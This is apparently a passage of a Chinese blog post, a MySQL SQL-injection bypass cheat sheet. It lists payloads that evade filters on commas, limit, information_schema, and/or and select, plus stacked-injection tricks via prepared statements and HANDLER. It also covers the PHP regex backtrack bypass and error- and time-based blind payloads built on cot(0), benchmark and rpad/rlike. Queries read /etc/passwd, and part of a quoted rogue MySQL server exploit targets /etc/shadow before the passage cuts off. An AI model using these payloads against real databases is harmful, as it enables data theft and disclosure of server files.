+<p>CONCAT(str1,str2…)</p>
+<p>函数用于将多个字符串合并为一个字符串</p>
+<p>GROUP_CONCAT(…)</p>
+<p>返回一个字符串结果，该结果由分组中的值连接组合而成。</p>
+<p>MAKE_SET(bits,str1,str2,…)</p>
+<p>根据参数1，返回所输入其他的参数值。可用作布尔盲注，如：<code>EXP(MAKE_SET((LENGTH(DATABASE())&gt;8)+1,&#39;1&#39;,&#39;710&#39;))</code>。</p>
+<p>函数&#x2F;语句</p>
+<p>说明</p>
+<p>LENGTH(str)</p>
+<p>返回字符串的长度。</p>
+<p>PI()</p>
+<p>返回π的具体数值。</p>
+<p>REGEXP “statement”</p>
+<p>正则匹配数据，返回值为布尔值。</p>
+<p>LIKE “statement”</p>
+<p>匹配数据，%代表任意内容。返回值为布尔值。</p>
+<p>RLIKE “statement”</p>
+<p>与regexp相同。</p>
+<p>LOCATE(substr,str,[pos])</p>
+<p>返回子字符串第一次出现的位置。</p>
+<p>POSITION(substr IN str)</p>
+<p>等同于 <code>LOCATE()</code>。</p>
+<p>LOWER(str)</p>
+<p>将字符串的大写字母全部转成小写。同：<code>LCASE(str)</code>。</p>
+<p>UPPER(str)</p>
+<p>将字符串的小写字母全部转成大写。同：<code>UCASE(str)</code>。</p>
+<p>ELT(N,str1,str2,str3,…)</p>
+<p>与<code>MAKE_SET(bit,str1,str2...)</code>类似，根据<code>N</code>返回参数值。</p>
+<p>NULLIF(expr1,expr2)</p>
+<p>若expr1与expr2相同，则返回expr1，否则返回NULL。</p>
+<p>CHARSET(str)</p>
+<p>返回字符串使用的字符集。</p>
+<p>DECODE(<em>crypt_str</em>,<em>pass_str</em>)</p>
+<p>使用 pass_str 作为密码，解密加密字符串 crypt_str。加密函数：<code>ENCODE(str,pass_str)</code>。</p>
+<h3 id="7-逗号被过滤"><a href="#7-逗号被过滤" class="headerlink" title="7.逗号被过滤"></a>7.逗号被过滤</h3><p><strong>用join代替：</strong><br>-1 union select 1,2,3<br>-1 union select * from (select 1)a join (select 2)b join (select 3)c%23</p>
+<p><strong>limit：</strong><br>limit 2,1<br>limit 1 offset 2</p>
+<p><strong>substr:</strong><br>substr(database(),5,1)<br>substr(database() from 5 for 1) from为从第几个字符开始，for为截取几个<br>substr(database() from 5)<br>如果for也被过滤了<br>mid(REVERSE(mid(database()from(-5)))from(-1)) reverse是反转，mid和substr等同</p>
+<p><strong>if:</strong><br>if(database()&#x3D;’xxx’,sleep(3),1)<br>id&#x3D;1 and databse()&#x3D;’xxx’ and sleep(3)<br>select case when database()&#x3D;’xxx’ then sleep(5) else 0 end</p>
+<h3 id="8-limit被过滤"><a href="#8-limit被过滤" class="headerlink" title="8.limit被过滤"></a><strong>8.limit被过滤</strong></h3><p>select user from users limit 1</p>
+<p>加限制条件，如：</p>
+<p>select user from users group by user_id having user_id &#x3D; 1 (user_id是表中的一个column)</p>
+<h3 id="9-information-schema被过滤"><a href="#9-information-schema被过滤" class="headerlink" title="9.information_schema被过滤"></a>9.information_schema被过滤</h3><p>innodb引擎可用mysql.innodb_table_stats、innodb_index_stats，日志将会把表、键的信息记录到这两个表中</p>
+<p>除此之外，系统表sys.schema_table_statistics_with_buffer、sys.schema_auto_increment_columns用于记录查询的缓存，某些情况下可代替information_schema</p>
+<h3 id="10-and-or-被过滤"><a href="#10-and-or-被过滤" class="headerlink" title="10.and or &amp;&amp; 被过滤"></a>10.and or &amp;&amp; 被过滤</h3><p>可用运算符! ^ ~以及not xor来代替：</p>
+<p>例如：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">真^真^真=真<br><br>真^假^真=假<br><br>真^(!(真^假))=假<br>……<br></code></pre></td></tr></table></figure>
+
+<p>等等一系列组合</p>
+<p>eg: select bbb from table1 where ‘29’&#x3D;’29’^if(ascii(substr(database(),1,1))&gt;0,sleep(3),0)^1;</p>
+<p>真则sleep(3)，假则无时延</p>
+<h2 id="三、特定场景的绕过"><a href="#三、特定场景的绕过" class="headerlink" title="三、特定场景的绕过"></a>三、特定场景的绕过</h2><h3 id="1-表名已知字段名未知的注入"><a href="#1-表名已知字段名未知的注入" class="headerlink" title="1.表名已知字段名未知的注入"></a>1.表名已知字段名未知的注入</h3><p><strong>join注入得到列名：</strong></p>
+<p>条件：有回显（本地尝试了下貌似无法进行时间盲注，如果有大佬发现了方法可以指出来）</p>
+<p>第一个列名：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">select * from(select * from table1 a join (select * from table1)b)c<br></code></pre></td></tr></table></figure>
+
+<p><a target="_blank" rel="noopener" href="https://s1.ax1x.com/2020/05/12/YUD2Kf.png" class='item-img' data-src='https://s1.ax1x.com/2020/05/12/YUD2Kf.png'><img src="https://s1.ax1x.com/2020/05/12/YUD2Kf.png" alt="YUD2Kf.png"></a></p>
+<p>第二个列名：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">select * from(select * from table1 a join (select * from table1)b using(balabala))c<br></code></pre></td></tr></table></figure>
+
+<p><a target="_blank" rel="noopener" href="https://s1.ax1x.com/2020/05/12/YUD72q.png" class='item-img' data-src='https://s1.ax1x.com/2020/05/12/YUD72q.png'><img src="https://s1.ax1x.com/2020/05/12/YUD72q.png" alt="YUD72q.png"></a></p>
+<p>第三个列名：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">select * from(select * from table1 a join (select * from table1)b using(balabala,eihey))c<br></code></pre></td></tr></table></figure>
+
+<p><a target="_blank" rel="noopener" href="https://s1.ax1x.com/2020/05/12/YUDjZF.png" class='item-img' data-src='https://s1.ax1x.com/2020/05/12/YUDjZF.png'><img src="https://s1.ax1x.com/2020/05/12/YUDjZF.png" alt="YUDjZF.png"></a></p>
+<p>以此类推……</p>
+<p>在实际应用的的过程中，该语句可以用于<strong>判断条件中</strong>：</p>
+<p>类似于select xxx from xxx where ‘1’&#x3D;’1’ and 语句&#x3D;’a’</p>
+<p><a target="_blank" rel="noopener" href="https://s1.ax1x.com/2020/05/12/YUrKzt.png" class='item-img' data-src='https://s1.ax1x.com/2020/05/12/YUrKzt.png'><img src="https://s1.ax1x.com/2020/05/12/YUrKzt.png" alt="YUrKzt.png"></a></p>
+<p><strong>join利用别名直接注入：</strong></p>
+<p>上述获取列名需要有回显，其实<strong>不需要知道列名即可获取字段内容</strong>：</p>
+<p>采用别名：union select 1,(select b.2 from (select 1,2,3,4 union select * from table1)b limit 1,1),3</p>
+<p>该语句即把(select 1,2,3,4 union select * from users)查询的结果作为表b，然后从表b的第1&#x2F;2&#x2F;3&#x2F;4列查询结果</p>
+<p>当然，1,2,3,4的数目要根据表的列名的数目来确定。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">select * from table1 where &#x27;1&#x27;=&#x27;&#x27; or if(ascii(substr((select b.2 from (select 1,2,3,4 union select * from table1)b limit 3,1),1,1))&gt;1,sleep(3),0)<br></code></pre></td></tr></table></figure>
+
+<h3 id="2-堆叠注入-select被过滤"><a href="#2-堆叠注入-select被过滤" class="headerlink" title="2.堆叠注入&amp;select被过滤"></a>2.堆叠注入&amp;select被过滤</h3><p>select被过滤一般只有在堆叠注入的情况下才可以绕过，除了极个别不需要select可以直接用password或者flag进行查询的情况</p>
+<p>在堆叠注入的场景里，最常用的方法有两个：</p>
+<p><strong>1.预编译：</strong></p>
+<p>没错，预编译除了防御SQL注入以外还可以拿来执行SQL注入语句，可谓双刃剑：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">id=1&#x27;;Set @x=0x31;Prepare a from “select balabala from table1 where 1=?”;Execute a using @x;<br></code></pre></td></tr></table></figure>
+
+<p>或者：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">set @x=0x73656c6563742062616c6162616c612066726f6d207461626c653120776865726520313d31;prepare a from @x;execute a;<br></code></pre></td></tr></table></figure>
+
+<p>上面一大串16进制是select balabala from table1 where 1&#x3D;1的16进制形式</p>
+<p><strong>2.Handler查询</strong></p>
+<p>Handler是Mysql特有的轻量级查询语句，并未出现在SQL标准中，所以SQL Server等是没有Handler查询的。</p>
+<p>Handler查询的用法：</p>
+<p>handler table1 open as fuck;&#x2F;&#x2F;打开句柄</p>
+<p>handler fuck read first;&#x2F;&#x2F;读所有字段第一条</p>
+<p>handler fuck read next;&#x2F;&#x2F;读所有字段下一条</p>
+<p>……</p>
+<p>handler fuck close;&#x2F;&#x2F;关闭句柄</p>
+<h3 id="3-PHP正则回溯BUG"><a href="#3-PHP正则回溯BUG" class="headerlink" title="3.PHP正则回溯BUG"></a>3.PHP正则回溯BUG</h3><p>PHP为防止正则表达式的DDos，给pcre设定了回溯次数上限，默认为100万次，超过这个上限则未匹配完，则直接返回False。</p>
+<p>例如存在preg_match(“&#x2F;union.+?select&#x2F;ig”,input)的过滤正则，则我们可以通过构造</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">union/*100万个1*/select<br></code></pre></td></tr></table></figure>
+
+<p>即可绕过。</p>
+<h3 id="4-PDO场景下的SQL注入"><a href="#4-PDO场景下的SQL注入" class="headerlink" title="4.PDO场景下的SQL注入"></a>4.PDO场景下的SQL注入</h3><p>PDO最主要有下列三项设置：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">PDO::ATTR_EMULATE_PREPARES<br><br>PDO::ATTR_ERRMODE<br><br>PDO::MYSQL_ATTR_MULTI_STATEMENTS<br></code></pre></td></tr></table></figure>
+
+<p>第一项为模拟预编译，如果为False，则不存在SQL注入；如果为True，则PDO并非真正的预编译，而是将输入统一转化为字符型，并转义特殊字符。这样如果是gbk编码则存在宽字节注入。</p>
+<p>第二项为报错，如果设为True，可能会泄露一些信息。</p>
+<p>第三项为多句执行，如果设为True，且第一项也为True，则会存在宽字节+堆叠注入的双重大漏。</p>
+<p>详情请查看我的另一篇文章：</p>
+<p><a target="_blank" rel="noopener" href="https://anylike.top/article?id=14">从宽字节注入认识PDO的原理和正确使用</a></p>
+<h3 id="5-Limit注入（5-7版本已经废除）"><a href="#5-Limit注入（5-7版本已经废除）" class="headerlink" title="5.Limit注入（5.7版本已经废除）"></a>5.Limit注入（5.7版本已经废除）</h3><p>适用于5.0.0-5.6.6版本</p>
+<p>如果存在一条语句为</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">select bbb from table1 limit 0,1<br></code></pre></td></tr></table></figure>
+
+<p>后面接可控参数，则可在后面接union select：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">select bbb from table1 limit 0,1 union select database();<br></code></pre></td></tr></table></figure>
+
+<p>如果查询语句加入了order by：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">select bbb from table1 order by balabala limit 0,1<br></code></pre></td></tr></table></figure>
+
+<p>，则可用如下语句注入：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">select bbb from table1 order by balabala limit 0,1 PROCEDURE analyse(1,1)<br></code></pre></td></tr></table></figure>
+
+<p>其中1可换为其他盲注的语句</p>
+<h3 id="6-特殊的盲注"><a href="#6-特殊的盲注" class="headerlink" title="6.特殊的盲注"></a>6.特殊的盲注</h3><p><strong>（1）查询成功与mysql error</strong></p>
+<p>与普通的布尔盲注不同，这类盲注只会回显执行成功和mysql error，如此只能通过可能会报错的注入来实现，常见的比较简单的报错函数有：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">整数溢出：cot(0), pow(999999,999999), exp(710)<br><br>几何函数：polygon(ans), linestring(ans)<br></code></pre></td></tr></table></figure>
+
+<p>因此可以按照下面的逻辑来构造语句：</p>
+<p>parameter&#x3D;1 and 语句 or cot(0)</p>
+<p>若语句为真，则返回正确结果并忽略后面的cot(0)；语句为假，则执行后面的cot(0)报错</p>
+<p><a target="_blank" rel="noopener" href="https://s1.ax1x.com/2020/05/13/YU6gYQ.png" class='item-img' data-src='https://s1.ax1x.com/2020/05/13/YU6gYQ.png'><img src="https://s1.ax1x.com/2020/05/13/YU6gYQ.png" alt="YU6gYQ.png"></a></p>
+<p>无回显的情况：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">select * from table1 where 1=1 and if(mid(user(),1,1)=&#x27;r&#x27;,benchmark(10000000,sha1(1)),1) and cot(0);<br>或<br>select * from table1 where 1=1 and if(mid(user(),1,1)=&#x27;r&#x27;,concat(rpad(1,349525,&#x27;a&#x27;),rpad(1,349525,&#x27;a&#x27;),rpad(1,349525,&#x27;a&#x27;)) RLIKE &#x27;(a.*)+(a.*)+(a.*)+(a.*)+(a.*)+(a.*)+(a.*)+asaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaadddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddasaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaadddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddasdasdasdasdasdasdasdasdasdasdasdadasdasdasdasdasdasdasdasdasdasdasd&#x27;,1) and cot(0);<br></code></pre></td></tr></table></figure>
+
+<p>用rpad+rlike以及benchmark的时间盲注可以成功，但是sleep()不可以，不太清楚原因。</p>
+<p><strong>（2）mysql error的前提下延时与不延时</strong></p>
+<p>这个看起来有点别扭，就是不管查询结果对还是不对，一定要mysql error</p>
+<p>还是感觉很别扭吧……网鼎杯web有道题就是这样的场景，insert注入但是只允许插入20条数据，所以不得不构造mysql error来达到在不插入数据的条件下盲注的目的。详情见<a target="_blank" rel="noopener" href="https://anylike.top/article?id=15">网鼎杯Writeup+闲扯</a></p>
+<p>有个很简单的方法当时没有想到，就是上面rpad+rlike的时间盲注，因为当时sleep测试是没法盲注的，但是没有测试rpad+rlike的情况，这个方法就是：</p>
+<p>假 or if(语句,rpad延时语句&#x3D;’a’,1) and cot(0)</p>
+<p>这样，无论语句是真是假，都会向后执行cot(0)，必然报错</p>
+<p>如果语句为真，则延时，如果语句为假，则不延时，这就完美的达到了目的</p>
+<p>payload：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">select * from table1 where 1=0 or if(mid(user(),1,1)=&#x27;s&#x27;,&#x27;a&#x27;=benchmark(1000000,sha1(1)),1) and cot(0);<br>或<br>select * from table1 where 1=0 or if(mid(user(),1,1)=&#x27;s&#x27;,&#x27;a&#x27;=concat(rpad(1,349525,&#x27;a&#x27;),rpad(1,349525,&#x27;a&#x27;),rpad(1,349525,&#x27;a&#x27;)) RLIKE &#x27;(a.*)+(a.*)+(a.*)+(a.*)+(a.*)+(a.*)+(a.*)+asaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaadddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddasaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaadddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddasdasdasdasdasdasdasdasdasdasdasdadasdasdasdasdasdasdasdasdasdasdasd&#x27;,1) and cot(0);<br></code></pre></td></tr></table></figure>
+
+<p>当然，比赛时想到的用sleep()的方法也是可以的。</p>
+<p>上面提到cot(0)会报错，即cot(False)会报错，所以只要让内部为False则必定会执行</p>
+<p>并且我们知道sleep(x)的返回值为0：</p>
+<p><a target="_blank" rel="noopener" href="https://s1.ax1x.com/2020/05/13/YUgHz9.png" class='item-img' data-src='https://s1.ax1x.com/2020/05/13/YUgHz9.png'><img src="https://s1.ax1x.com/2020/05/13/YUgHz9.png" alt="YUgHz9.png"></a></p>
+<p>这样就很好办了，if(语句,sleep(3),0)，这样语句不管为真还是假都返回False</p>
+<p>所以构造语句</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">select * from table1 where &#x27;1&#x27;=&#x27;1&#x27; and cot(if(ascii(substr(database(),1,1))&gt;0,sleep(3),0));<br></code></pre></td></tr></table></figure>
+
+<p><strong>（3）表名未知</strong></p>
+<p>表名未知只能去猜表名，通过构造盲注去猜测表名，这里不再过多赘述。</p>
+<h2 id="四-文件的读写"><a href="#四-文件的读写" class="headerlink" title="四.文件的读写"></a>四.文件的读写</h2><p><strong>1.读写权限</strong></p>
+<p>在进行MySQL文件读写操作之前要先查看是否拥有权限，mysql文件权限存放于mysql表的file_priv字段，对应不同的User，如果可以读写，则数据库记录为Y，反之为N：</p>
+<p><a target="_blank" rel="noopener" href="https://s1.ax1x.com/2020/05/14/YD261K.png" class='item-img' data-src='https://s1.ax1x.com/2020/05/14/YD261K.png'><img src="https://s1.ax1x.com/2020/05/14/YD261K.png" alt="YD261K.png"></a></p>
+<p>我们可以通过user()查看当前用户是什么，如果对应用户具有读写权限，则往下看，反之则放弃这条路找其他的方法。</p>
+<p>除了要查看用户权限，还有一个地方要查看，即<strong>secure-file-priv</strong>。它是一个系统变量，用于限制读写功能，它的值有三种：</p>
+<p>（1）无内容，即无限制</p>
+<p>（2）为NULL，表示禁止文件读写</p>
+<p>（3）为目录名，表示仅能在此目录下读写</p>
+<p>可用select @<a target="_blank" rel="noopener" href="https://github.com/secure_file_priv">@secure_file_priv</a>查看：</p>
+<p><a target="_blank" rel="noopener" href="https://s1.ax1x.com/2020/05/14/YDRdv8.png" class='item-img' data-src='https://s1.ax1x.com/2020/05/14/YDRdv8.png'><img src="https://s1.ax1x.com/2020/05/14/YDRdv8.png" alt="YDRdv8.png"></a></p>
+<p>此处为Windows环境，可以读写的目录为E:wamp64tmp</p>
+<p><strong>2.读文件</strong></p>
+<p>如果满足上述2个条件，则可尝试读写文件了。</p>
+<p>常用的读文件的语句有如下几种：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">select load_file(file_path);<br>load data infile &quot;/etc/passwd&quot; into table 库里存在的表名 FIELDS TERMINATED BY &#x27;n&#x27;; #读取服务端文件<br>load data local infile &quot;/etc/passwd&quot; into table 库里存在的表名 FIELDS TERMINATED BY &#x27;n&#x27;; #读取客户端文件<br></code></pre></td></tr></table></figure>
+
+<p>需要注意的是，file_path必须为绝对路径，且反斜杠需要转义：</p>
+<p><a target="_blank" rel="noopener" href="https://s1.ax1x.com/2020/05/14/YDfSyT.png" class='item-img' data-src='https://s1.ax1x.com/2020/05/14/YDfSyT.png'><img src="https://s1.ax1x.com/2020/05/14/YDfSyT.png" alt="YDfSyT.png"></a></p>
+<p><strong>3.mysql任意文件读取漏洞</strong></p>
+<p>攻击原理详见：<a target="_blank" rel="noopener" href="https://paper.seebug.org/1112/">https://paper.seebug.org/1112/</a></p>
+<p>exp：</p>
+<p>摘自：<a target="_blank" rel="noopener" href="https://github.com/Gifts/Rogue-MySql-Server/blob/master/rogue_mysql_server.py">https://github.com/Gifts/Rogue-MySql-Server/blob/master/rogue_mysql_server.py</a></p>
+<p>下面filelist是需要读取的文件列表，需要自行设置，该漏洞需要一个恶意mysql服务端，执行exp监听恶意mysql服务的对应端口，在目标服务器登录恶意mysql服务端</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">#!/usr/bin/env python<br>#coding: utf8<br><br>import socket<br>import asyncore<br>import asynchat<br>import struct<br>import random<br>import logging<br>import logging.handlers<br><br>PORT = 3306<br>log = logging.getLogger(__name__)<br>log.setLevel(logging.DEBUG)<br>tmp_format = logging.handlers.WatchedFileHandler(&#x27;mysql.log&#x27;, &#x27;ab&#x27;)<br>tmp_format.setFormatter(logging.Formatter(&quot;%(asctime)s:%(levelname)s:%(message)s&quot;))<br>log.addHandler(<br>    tmp_format<br>)<br><br>filelist = (<br>#    r&#x27;c:boot.ini&#x27;,<br>    r&#x27;c:windowswin.ini&#x27;,<br>#    r&#x27;c:windowssystem32driversetchosts&#x27;,<br>#    &#x27;/etc/passwd&#x27;,<br>#    &#x27;/etc/shadow&#x27;,<br>)<br><br>#================================================<br>#=======No need to change after this lines=======<br>#================================================<br><br>__author__ = &#x27;Gifts&#x27;<br><br>def daemonize():<br>    import os, warnings<br>    if os.name != &#x27;posix&#x27;:<br>        warnings.warn(&#x27;Cant create daemon on non-posix system&#x27;)<br>        return<br><br>    if os.fork(): os._exit(0)<br>    os.setsid()<br>    if os.fork(): os._exit(0)<br>    os.umask(0o022)<br>    null=os.open(&#x27;/dev/null&#x27;, os.O_RDWR)<br>    for i in xrange(3):<br>        try:<br>            os.dup2(null, i)<br>        except OSError as e:<br>            if e.errno != 9: raise<br>    os.close(null)<br><br>class LastPacket(Exception):<br>    pass<br><br>class OutOfOrder(Exception):<br>    pass<br><br>class mysql_packet(object):<br>    packet_header = struct.Struct(&#x27;&lt;Hbb&#x27;)<br>    packet_header_long = struct.Struct(&#x27;&lt;Hbbb&#x27;)<br>    def __init__(self, packet_type, payload):<br>        if isinstance(packet_type, mysql_packet):<br>            self.packet_num = packet_type.packet_num + 1<br>        else:<br>            self.packet_num = packet_type<br>        self.payload = payload<br><br>    def __str__(self):<br>        payload_len = len(self.payload)<br>        if payload_len &lt; 65536:<br>            header = mysql_packet.packet_header.pack(payload_len, 0, self.packet_num)<br>        else:<br>            header = mysql_packet.packet_header.pack(payload_len &amp; 0xFFFF, payload_len &gt;&gt; 16, 0, self.packet_num)<br><br>        result = &quot;&#123;0&#125;&#123;1&#125;&quot;.format(<br>            header,<br>            self.payload<br>        )<br>        return result<br><br>    def __repr__(self):<br>        return repr(str(self))<br><br>    @staticmethod<br>    def parse(raw_data):<br>        packet_num = ord(raw_data[0])<br>        payload = raw_data[1:]<br><br>        return mysql_packet(packet_num, payload)<br><br>class http_request_handler(asynchat.async_chat):<br><br>    def __init__(self, addr):<br>        asynchat.async_chat.__init__(self, sock=addr[0])<br>        self.addr = addr[1]<br>        self.ibuffer = []<br>        self.set_terminator(3)<br>        self.state = &#x27;LEN&#x27;<br>        